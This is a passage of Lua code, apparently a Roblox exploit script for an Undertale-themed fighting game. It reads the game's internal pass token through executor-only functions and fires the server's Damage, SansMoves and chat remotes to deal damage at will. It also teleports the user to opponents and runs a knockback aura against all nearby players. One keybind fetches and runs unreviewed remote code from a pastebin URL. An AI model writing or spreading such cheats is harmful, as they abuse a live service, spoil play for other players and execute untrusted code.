				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0, 0.1), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0, 200), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
end
end
  end
end)
    
    phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "c" then
	    if phase2 == true then
		
		wait(0.5)
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3733309848"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "LightHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(20, 0, 100), 
				["Damage"] = 40
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
	end
end
end)

-- Phase 4

local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "7" then
	    
     loadstring(game:HttpGet("https://pastebin.com/raw/buxdqU1f"))()
     
     wait(300)
     
     game.Players.LocalPlayer:Kick[[You couldn't defeat them... Better luck next time.]]
	end
 end)
---------------------------------------
phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "n" then
	    if phase2 == true then
	    
	    tpToOpponent()
	    wait(0.2)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        wait(0.9)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        wait(0.9)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        wait(0.9)
        normalSlash()
        game.ReplicatedStorage.Effects.KnifeHitEffect22.BallEffect.Color = Color3.fromRGB(170, 0, 170)
for i,v in pairs(getconnections(game:GetService("ReplicatedStorage").Remotes.Effects.OnClientEvent)) do
v:Fire({"Model","KnifeHitEffect22",game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.HumanoidRootPart.CFrame})
        
        wait(2)
	    
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3733309848"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.2, 
				["Type"] = "Knockback", 
				["HitEffect"] = "LightHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Knockback2, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick,
				["CameraShake"] = "Bump",
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 150, 0), 
				["Damage"] = 40
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		
		wait(0.7)
		
		function getNil(name,class) for _,v in pairs(getnilinstances())do if v.ClassName==class and v.Name==name then return v;end end end

local locked = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value

local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "GasterBlasters",
        [3] = "SummonOne",
        [4] = locked.Torso.Position
    }
}
 
game:GetService("ReplicatedStorage").Remotes.SansMoves:InvokeServer(unpack(args)) 

end
end
end
end
end
end
end)

function tpToOpponent()
function getlockchar()
                    local char = game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
                    return char
                end
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = getlockchar().HumanoidRootPart.CFrame * CFrame.new(0,0,-3)
end

function normalSlash()
    spawn(function()
KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 5
		KG.SoundId = "rbxassetid://6930257355"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://4800266314"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
    local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = {
        ["HitTime"] = 1, 
        ["Type"] = "Knockback", 
        ["HitEffect"] = "KnifeHitEffect", 
        ["CombatInv"] = true,
        ["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt2, 
        ["Velocity"] = Vector3.new(0, 0.1, 0), 
        ["Sound"] = game:GetService("ReplicatedStorage").Sounds.KnifeHit,
        ["Damage"] = 15
        
        } local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		  Event:InvokeServer(A_1, A_2, A_3)
    

end)
end

spawn(function()
lvSystem = true
lvBarVal = 0.01

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.Players.LocalPlayer.PlayerGui.UI.Ui:GetDescendants()) do
if v.Name == 'StaminaBar' then
clone2 = v:Clone()
clone2.Parent = game.Players.LocalPlayer.PlayerGui.UI.Ui
clone2.Position = UDim2.new(0.4799, 0, 0.9900, 0)
clone2.Bar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
clone2.Bar.Size = UDim2.new(0, 0, 1, 0)
clone2.ImageLabel:Destroy()
clone2.LocalScript:Destroy()
clone2.Name = 'ExpBar'
end
end
end)


local ScreenGui = Instance.new("ScreenGui")
local TextLabel = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui.ResetOnSpawn = false

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel.Parent = ScreenGui
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel.BackgroundTransparency = 1.00
TextLabel.Position = UDim2.new(0.360625994056, 0, .925, 0)
TextLabel.Size = UDim2.new(0, 250, 0, 75)
TextLabel.Font = Enum.Font.Arcade
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 35.000
TextLabel.TextWrapped = true
TextLabel.Text = 'EXP'

lv = 1
local ScreenGui = Instance.new("ScreenGui")
local TextLabel2 = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui.ResetOnSpawn = false

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel2.Parent = ScreenGui
TextLabel2.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel2.BackgroundTransparency = 1.00
TextLabel2.Position = UDim2.new(0.360625994056, 0, .8935, 0)
TextLabel2.Size = UDim2.new(0, 250, 0, 75)
TextLabel2.Font = Enum.Font.Arcade
TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel2.TextSize = 35.000
TextLabel2.TextWrapped = true
TextLabel2.Text = 'LV: '..(lv)

local ScreenGui2 = Instance.new("ScreenGui")
local TextLabel3 = Instance.new("TextLabel")
local block
local unblock 
    camfix2 = 10
--Properties:
ScreenGui2.ResetOnSpawn = false

ScreenGui2.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

TextLabel3.Parent = ScreenGui
TextLabel3.BackgroundColor3 = Color3.fromRGB(255, 0, 255)
TextLabel3.BackgroundTransparency = 1.00
TextLabel3.Position = UDim2.new(0.490625994056, 0, .8935, 0)
TextLabel3.Size = UDim2.new(0, 250, 0, 75)
TextLabel3.Font = Enum.Font.Arcade
TextLabel3.TextColor3 = Color3.fromRGB(35, 255, 50)
TextLabel3.TextSize = 45.000
TextLabel3.TextWrapped = true
TextLabel3.Text = 'Level up!'
TextLabel3.Transparency = 1
TextLabel3.BackgroundTransparency = 1.00

spawn(function()
notLVing = true
repeat wait(1)
spawn(function()
repeat wait() until game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value ~= nil
lockChar = workspace:FindFirstChild(game.Players.LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value.Name)
repeat wait()
until lockChar.Humanoid.Health < 0.2
if notLVing == true then
print("die'd")
if lockChar.Type.Value == "XSans" then
    print("lv up1")
        lvBarVal = lvBarVal + 0.3
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Sans" then
    print("lv up2")
    lvBarVal = lvBarVal + 0.5
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Frisk" then
    print("lv up3")
    lvBarVal = lvBarVal + 0.15
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "SansBadTime" then
    print("lv up4")
    lvBarVal = lvBarVal + 0.5
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Chara" then
    print("lv up5")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "SFChara" then
    print("lv up6")
    lvBarVal = lvBarVal + 0.25
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "DeltaSans" then
    print("lv up7")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Undyne" then
    print("lv up8")
    lvBarVal = lvBarVal + 0.6
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Asriel" then
    print("lv up9")
    lvBarVal = lvBarVal + 0.4
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "GTFrisk" then
    print("lv up10")
    lvBarVal = lvBarVal + 0.6
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Betty" then
    print("lv up11")
    lvBarVal = lvBarVal + 0.3
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Sakuya" then
    print("lv up12")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Stevonnie" then
    print("lv up13")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
elseif lockChar.Type.Value == "Bunny" then
    print("lv up14")
    lvBarVal = lvBarVal + 0.2
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
else print("bro wtf are you fighting")
end
notLVing = false
wait(1.2)
notLVing = true
elseif notLVing == false then
    wait()
end
end)
until false
end)

lvIncreasing = false
spawn(function()
repeat wait(0.1)
spawn(function()
repeat wait() until lvBarVal >= 1
print("debug1")
if lvIncreasing == false then
    lvIncreasing = true
    print("debug2")
lv = lv + 1
TextLabel2.Text = 'LV: '..(lv)
print("debug3")
lvBarVal = 0.01
clone2.Bar.Size = UDim2.new(0, 0, 1, 0)

local player = game.Players.LocalPlayer
local char = player.Character

for _,v in pairs(game.ReplicatedStorage.Effects.LevelUpShower:GetChildren()) do
spawn(function()
fakelevel = v.Name
local A_1 =  {
      [1] = getrenv()._G.Pass, 
      [2] = "PlaySound", 
      [3] = v, 
      [4] = char
}
local Event = game:GetService("ReplicatedStorage").Remotes.Functions
Event:InvokeServer(A_1)

end)
print("debug2")
spawn(function()
local player = game.Players.LocalPlayer
local char = player.Character
local sound = Instance.new('Sound',char.Head)
local id = 2167611163
sound.Volume = 4
sound.SoundId = 'rbxassetid://'..id
sound:Play()
end)

end

spawn(function()
TextLabel3.Transparency = 0
TextLabel3.BackgroundTransparency = 1.00
wait(0.5)
TextLabel3.Transparency = 0.1
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.2
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.3
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.4
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.5
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.6
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.7
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.8
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 0.9
TextLabel3.BackgroundTransparency = 1.00
wait(0.1)
TextLabel3.Transparency = 1
TextLabel3.BackgroundTransparency = 1.00
end)

spawn(function()
 camfix2 = 15
repeat
game.Lighting.ColorCorrection.TintColor = Color3.fromRGB(camfix2, 255, camfix2)
wait()
camfix2 = camfix2 + 10
until camfix2 == 255
if camfix2 == 255 then
    camfix2 = 15
end
end)

wait(1)
for _,v in pairs(char.Head:GetChildren()) do
if v.Name == fakelevel then
v:Destroy()
wait(0.2)
lvup = true
end
end

wait(2)
lvIncreasing = false
print("debug4")
end
end)
until lvSystem == false
end)

ninePressed = false
game:GetService("UserInputService").InputBegan:Connect(function(key, gc)
    if gc then return end
    if key.KeyCode == Enum.KeyCode["Nine"] then
    if lvPlaying == true then
    print("wait a sec")
    else
        if ninePressed == false then
        local player = game.Players.LocalPlayer
        local char = player.Character
        local sound = Instance.new('Sound',char.Head)
        local id = 5665639497
        sound.Volume = 3
        sound.SoundId = 'rbxassetid://'..id
        sound:Play()
        wait()
        local player = game.Players.LocalPlayer
        local char = player.Character
        local sound = Instance.new('Sound',char.Head)
        local id = 5665639750
        sound.Volume = 3
        sound.SoundId = 'rbxassetid://'..id
        sound:Play()
        wait(0.1)
        ninePressed = true
        repeat wait()
            TextLabel2.Text = 'LV: '..(lv)
            lv = lv + 1
            TextLabel2.Text = 'LV: '..(lv)
        until lv == 13
        end
end
end
end)

game:GetService("UserInputService").InputBegan:Connect(function(key, gc)
    if gc then return end
    if key.KeyCode == Enum.KeyCode["Zero"] then
            print("lv up13")
    lvBarVal = lvBarVal + 0.1
    clone2.Bar.Size = UDim2.new(lvBarVal, 0, 1, 0)
end
end)

end)

lvcheck = true
spawn(function()
repeat wait()
if lv == 1 then truelv = 1
elseif lv == 2 then truelv = 2
elseif lv == 3 then truelv = 3
elseif lv == 4 then truelv = 4
elseif lv == 5 then truelv = 5
elseif lv == 6 then truelv = 6
elseif lv == 7 then truelv = 7
elseif lv == 8 then truelv = 8
elseif lv == 9 then truelv = 9
elseif lv == 10 then truelv = 10
elseif lv >= 10 then truelv = 10
end
until lvcheck == false
end)

function maxLV()
    col = 255
    print("debug2231")
    repeat wait()
        lv = lv + 1
        col = col - 5
        TextLabel.Text = 'LV: '..(lv)
        TextLabel.TextColor3 = Color3.fromRGB(255, col, col)
    until lv == 99
end

function KnockbackAura(val)
    kbAura = true
if kbAura == true then
repeat wait(1.1)
local player = game.Players.LocalPlayer
local char = player.Character
for _,v in pairs(game.workspace:GetChildren()) do

if v:FindFirstChildOfClass('Humanoid') then
if v:FindFirstChild('Torso') then
range = (char.PrimaryPart.Position - v.PrimaryPart.Position).Magnitude
if range <15 and v.Name ~= player.Name then
print("debug23837")
spawn(function()
local A_1 = getrenv()._G.Pass
local A_2 = v
local A_3 =  {
      ["Type"] = "Knockback", 
      ['HitEffect'] = 'HeavyHitEffect',
      ["HitTime"] = 2, 
      ["Velocity"] = Vector3.new(0,35,0) + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.lookVector * 75,
      ["VictimCFrame"] = CFrame.new(), 
      ['CombatInv'] = true,
      ["Damage"] = 10
}
local Event = game:GetService("ReplicatedStorage").Remotes.Damage
Event:InvokeServer(A_1, A_2, A_3)
end)
end
end
end
end

until kbAura == false
end
end

phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "v" then 
	    if phase2 == true then
	        wait(1)
		local A_1 = 
			{
				[1] = getrenv()._G.Pass,
				[2] = "Chatted", 
				[3] = " You will NEVER WIN!",
				[4] = Color3.fromRGB(255, 255, 255),
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Events
		Event:FireServer(A_1)
		
		wait(0.5) 
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3752218582"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.GutHurt, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 100), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
	end
end
end)

phase2 = true
local mouse = game.Players.LocalPlayer:GetMouse()
mouse.KeyDown:Connect(function(k) 
	if k == "b" then 
	    if phase2 == true then
	        wait(1)
		local A_1 = 
			{
				[1] = getrenv()._G.Pass,
				[2] = "Chatted", 
				[3] = " Let's have some fun.",
				[4] = Color3.fromRGB(255, 255, 255),
			}
			local Event = game:GetService("ReplicatedStorage").Remotes.Events
		Event:FireServer(A_1)
		
		wait(0.5) 
		
		KG = Instance.new("Sound", game.Players.LocalPlayer.Character)
		KG.Volume = 1
		KG.SoundId = "rbxassetid://357417055"
		KG.Looped = false
		KG:Play()
		local Anim = Instance.new("Animation")
		Anim.AnimationId = "rbxassetid://3746476750"
		local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
		k:Play()
		k:AdjustSpeed(1)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Normal", 
				["HitEffect"] = "BoneHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(0, 0.1, 0), 
				["Damage"] = 8
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(40, 20, 40), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
		local A_1 = getrenv()._G.Pass
		local A_2 = game:GetService("Players").LocalPlayer.Backpack.Main.LockOnScript.LockOn.Value
		local A_3 = 
			{
				["HitTime"] = 0.6, 
				["Type"] = "Knockback", 
				["HitEffect"] = "HeavyHitEffect", 
				["HurtAnimation"] = game:GetService("ReplicatedStorage").Animations.HurtAnimations.Hurt1, 
				["Sound"] = game:GetService("ReplicatedStorage").Sounds.Kick, 
				["CombatInv"] = true,
				["Velocity"] = Vector3.new(100, 20, 100), 
				["Damage"] = 40
			}
		local Event = game:GetService("ReplicatedStorage").Remotes.Damage
		Event:InvokeServer(A_1, A_2, A_3)
	end
end
end)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Resources.MoveEffects.GasterBlasters.GasterBlaster:GetChildren()) do
if v.Name == 'Head' then
clone19 = v:Clone()
clone19.Name = 'SmallBlasterHead'
clone19.Parent = char
clone19.Anchored = false
clone19.Union.Anchored = false
clone19.BodyUnion.Anchored = false
clone19.Eye.Anchored = false

for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'Eye' then
v.Name = 'BlasterEye'
end
end

weld1 = Instance.new('Weld',clone19)
weld1.Part0 = clone19
weld1.Part1 = char['Head']
weld1.C0 = CFrame.new(-9, -3.6, -3)*CFrame.Angles(0, 0, 0)
clone19.Transparency = 0
end
end

spawn(function()
repeat
    for hue = 0, 1, 1/360 do
        wait()
for _,v in pairs(clone19:GetDescendants()) do
if v.Name == 'BlasterEye' then
v.Color = Color3.fromHSV(hue, 1, 1)

spawn(function()
local A_1 =  {
      [1] = getrenv()._G.Pass, 
      [2] = "PlaySound", 
      [3] = game:GetService('ReplicatedStorage').Resources.Sounds.Moves.GasterBlasters.Gaster_Summon, 
      [4] = char.Head
}
local Event = game:GetService("ReplicatedStorage").Remotes.Functions
Event:InvokeServer(A_1)
end)
end
end
end
until false
end)
end)

wait(2)

spawn(function()
player = game.Players.LocalPlayer
char = player.Character
for _,v in pairs(game.ReplicatedStorage.Resources.MoveEffects.GasterBlasters.GasterBlaster:GetChildren()) do
